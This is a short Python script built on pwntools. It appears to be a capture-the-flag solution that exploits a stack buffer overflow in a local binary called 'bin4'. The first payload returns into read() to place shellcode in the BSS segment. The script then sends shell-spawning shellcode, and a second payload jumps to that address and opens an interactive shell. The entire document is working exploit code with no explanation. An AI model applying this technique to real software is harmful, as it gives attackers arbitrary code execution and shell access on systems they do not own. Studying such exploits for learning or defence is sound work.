from pwn import *
from binascii import hexlify

r=process('./bin4')

elf=ELF('bin4')

readAddr=0x806e680
backAddr=0x8048d93
hackBss=0x80ecf80

padding='a'*0x8c+'b'*0x4

payload1=''
payload1+=padding
payload1+=p32(readAddr)
payload1+=p32(backAddr)
payload1+=p32(0x0)
payload1+=p32(hackBss)
#lack of the third arg but no impact

payload2=''
payload2+=padding
payload2+=p32(hackBss)

r.sendlineafter('Input:',payload1)
r.sendline(asm(shellcraft.sh()))
# r.recvuntil('=============================================================\n\n')
r.sendlineafter('Input:',payload2)

r.interactive()